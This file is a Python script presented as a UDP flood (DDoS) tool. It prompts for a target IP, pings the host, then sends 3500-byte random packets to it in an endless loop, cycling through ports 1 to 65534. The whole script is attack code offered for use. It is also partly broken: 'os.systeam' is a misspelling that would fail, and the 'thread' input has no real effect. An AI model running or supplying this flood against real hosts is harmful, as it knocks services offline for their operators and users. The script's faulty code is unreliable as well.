import sys
import os
import time
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(3500)

ip = input("IP Target : ")
port = 1
thread=int(input("Thread : "))

if len(ip)==0:
     print()
     print("Error[001]   No IP!")
     sys.exit(0)

alive=os.system("ping -n 1 " + ip)
if alive!=0:
     print("Error[003]  IP can't connect!")
     sys.exit(0)

def ddos():
     sock.sendto(bytes,(ip,port))
     sock.sendto(bytes,(ip,port))
print()

print("Starting DDos .....")
time.sleep(2)
os.systeam("cls")
os.systeam("clear")

sent = 0
while True:
     i=1
     while True:
          ddos()
          if i<=thread:
               break;
     sent = sent + 1
     port = port + 1
     print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1
